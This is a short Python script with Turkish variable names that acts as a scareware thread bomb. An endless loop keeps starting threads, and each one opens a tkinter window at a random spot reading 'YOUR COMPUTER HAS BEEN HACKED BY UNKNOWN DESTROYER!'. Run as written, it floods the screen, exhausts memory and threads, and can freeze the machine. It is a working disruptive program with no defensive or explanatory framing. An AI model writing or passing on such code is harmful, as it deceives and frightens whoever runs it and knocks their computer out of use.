import tkinter as tk
import random
import threading


hata_mesaji = "YOUR COMPUTER HAS BEEN HACKED BY UNKNOWN DESTROYER!"


def pencere_olustur():
    pencere = tk.Tk()
    

    pencere.title("HACKED")
    

    pencere.geometry(f"600x100+{random.randint(0, pencere.winfo_screenwidth() - 600)}+{random.randint(0, pencere.winfo_screenheight() - 100)}")
    

    label = tk.Label(pencere, text=hata_mesaji, fg="red", font=("Arial", 14, "bold"))
    label.pack(expand=True)
    

    pencere.after(9999000, pencere.destroy)
    
    pencere.mainloop()


def baslat():
    while True:
        threading.Thread(target=pencere_olustur).start()


baslat()
